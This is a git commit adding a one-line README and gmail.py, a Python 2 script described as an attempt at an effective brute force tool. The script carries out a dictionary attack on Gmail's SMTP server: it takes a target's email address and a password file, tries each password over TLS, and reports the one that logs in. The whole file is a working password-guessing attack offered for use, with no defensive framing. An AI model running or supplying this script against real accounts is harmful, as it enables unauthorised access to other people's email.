c43a00b6d07522d976ea6d1f7a818a0869c8baff
kakatoji <kakatoji0@gmail.com>
2018-05-14 00:00:19 +0800

    Add files via upload

---
+++ README.md
@@ -0,0 +1,1 @@
+this will be all my trys at making an effevtive brute force script in python
---
+++ gmail.py
@@ -0,0 +1,29 @@
+
+
+
+
+# Purpose: Brute force smtp.gmail.com using a dictionary attack over TLS.
+
+import time
+import smtplib
+
+smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
+smtpserver.ehlo()
+smtpserver.starttls()
+
+user = raw_input("Enter the target's email address: ")
+passwfile = raw_input("Enter the password file name: ")
+passwfile = open(passwfile, "r")
+
+for password in passwfile:
+	time.sleep(5)	
+	
+	
+	
+	try:
+		smtpserver.login(user, password)
+
+		print "[+] Password Found: %s" % password
+		break;
+	except smtplib.SMTPAuthenticationError:
+		print "[!] Password Incorrect: %s" % password
